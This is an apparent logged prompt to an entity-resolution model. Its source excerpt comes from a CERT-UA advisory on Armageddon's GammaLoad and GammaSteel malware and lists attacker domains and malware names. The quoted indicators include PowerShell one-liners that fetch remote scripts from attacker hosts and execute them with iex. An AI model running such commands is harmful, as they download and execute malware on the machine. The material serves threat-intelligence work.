=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. GammaLoad.PS1_v2
E4. stage1.ps1
E5. GraphSteel
E6. z.ps1
E7. stage2.ps1
E8. OUTSTEEL
E9. POWERGAP
E10. TRYxaEbX_2.ps1
E11. .NET Framework
E12. MarsStealer
E13. GrimPlant
E14. RelicRace
E15. Internet Explorer
E16. JesterStealer
E17. FTPGetter
E18. Formbook
E19. Hashcat
E20. needrestart
E21. Meterpreter
E22. DarkCrystal RAT
E23. Pterodo
E24. PowerShell [aka powershell.exe]
E25. csrss.exe [aka crsse.exe]
E26. 223329.exe [aka 62ea.exe, 966449.exe]
E27. MSCommondll.exe
E28. AdvancedRun.exe
E29. SPECTR.Shell
E30. Icloud.exe [aka Iclouding.exe]
E31. BitdefenderWindowsUpdatePackage.exe
E32. GammaSteel.NET
E33. HarvesterX
E34. PowerShell (powershell.exe)
E35. GammaSteel.PS1
E36. co87972.tmweb.ru
E37. acteran.ru
E38. bilitora.ru
E39. rmssrv2.ru [aka rmssrv4.ru, rmssrv3.ru]
E40. surname192.temp.swtest.ru
E41. apoxipodes.ru
E42. fishitor.ru
E43. a0695487.xsph.ru
E44. tiloraso.ru
E45. a0322810.xsph.ru
E46. dodortar.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. a0698649.xsph.ru
E50. motocheck.in
E51. stormpredictor.host
E52. a0656203.xsph.ru
E53. meteolink.host
E54. successilin.top
E55. erwini.ru
E56. tortunas.ru
E57. mulleti.ru
E58. a0698262.xsph.ru
E59. bul-opros.top
E60. billyhot.ru
E61. iol.pt
E62. toknowall.com
E63. gopoppers.com
E64. kopratiso.ru
E65. podologaneri.it
E66. co-opros.top
E67. districoperav.icu
E68. potrakit.ru
E69. giraffe-tour.ru
E70. rivierafamily.com
E71. nitikora.ru
E72. tridiuma.ru
E73. yandex.ru
E74. varanasiclick.ru
E75. olei.ro
E76. jevejosader.top
E77. enlamentedeunasesor.com
E78. milotrad.ru
E79. milotraf.ru
E80. 3utilities.com
E81. s8.h.mchost.ru
E82. aspe.ro
E83. omyce.ru
E84. pastebin.com
E85. leonardis.ru
E86. jokotras.ru
E87. afi-opros.top
E88. nikotod.ru
E89. mitraseo.hol.es
E90. parodadoca.ru
E91. marmaris.com.ua
E92. xsph.ru
E93. nx0.ru
E94. ncscc.gov.ua
E95. www.msftncsi.com
E96. wi-opros.top
E97. xcasinobonuses.net
E98. viewdns.net
E99. servebeer.com
E100. evil.server.com
E101. ddnsking.com
E102. agreminj.com
E103. ns.ns2-dns.com [aka ns2-dns.com, ns.ns3-dns.com, ns3-dns.com]
E104. airmauritiusticket.com
E105. cloudflare-dns.com
E106. eo9p1d2bfmioiot.m.pipedream.net
E107. bounceme.net
E108. ddns.net
E109. eoiw8lhjwuc3sh2.m.pipedream.net
E110. plexbd.net
E111. sytes.net
E112. brunoboys.net
E113. eoy7zvsvn6xfcmy.m.pipedream.net
E114. dcshost.net
E115. gov-ua.info
E116. freedynamicdns.net [aka freedynamicdns.org]
E117. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E118. dyndns.com
E119. gotdns.ch
E120. servecounterstrike.com
E121. www.facebook.com
E122. www.michiganmastereltiempo.com
E123. www.symantec.com
E124. servehttp.com
E125. atlantar.ru
E126. motoristo.ru
E127. moolin.ru
E128. bubenci.ru
E129. callsol.ru
E130. clipperso.ru
E131. cooperi.ru
E132. detroito.ru
E133. farafauler.ru
E134. flayga.ru
E135. ganara.ru
E136. hawksi.ru
E137. hofsteder.ru
E138. kilitro.ru
E139. kurapat.ru
E140. lnasfe.ru
E141. lopasts.ru
E142. mafirti.ru
E143. metanat.ru
E144. mitlubald.ru
E145. paparat.ru
E146. pasamart.ru
E147. qkcew.ru
E148. rncsq.ru
E149. tarlit.ru
E150. tbwelo.ru
E151. wicksl.ru
E152. xcqef.ru
E153. nxkad.ru
E154. dnslookup.seowebchecker.com
E155. tools.nexcess.net
E156. viewdns.info
E157. www.portcheckers.com
E158. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E1, E11, E3, E5 — ctx: S1
M3. "HarvesterX" (Software) — options: E16, E17, E18, E12 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E24, E25, E26, E9 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E36, E37, E38, E39
M6. "atlantar.ru" (Domain) — options: E43, E46, E39, E36
M7. "motoristo.ru" (Domain) — options: E42, E44, E50, E39 — ctx: S8
M8. "moolin.ru" (Domain) — options: E45, E37, E39, E52
M9. "bubenci.ru" (Domain) — options: E45, E37, E55, E39
M10. "callsol.ru" (Domain) — options: E36, E60, E47, E39
M11. "clipperso.ru" (Domain) — options: E43, E37, E63, E39
M12. "cooperi.ru" (Domain) — options: E64, E37, E65, E39
M13. "detroito.ru" (Domain) — options: E45, E55, E38, E39
M14. "farafauler.ru" (Domain) — options: E52, E37, E69, E39
M15. "flayga.ru" (Domain) — options: E42, E37, E38, E39 — ctx: S4
M16. "ganara.ru" (Domain) — options: E38, E73, E39, E69 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E43, E55, E39, E52
M18. "hofsteder.ru" (Domain) — options: E36, E37, E76, E39
M19. "kilitro.ru" (Domain) — options: E38, E39, E42, E78
M20. "kurapat.ru" (Domain) — options: E64, E68, E60, E39
M21. "lnasfe.ru" (Domain) — options: E43, E82, E83, E39 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E64, E84, E39, E85
M23. "mafirti.ru" (Domain) — options: E36, E57, E39, E64
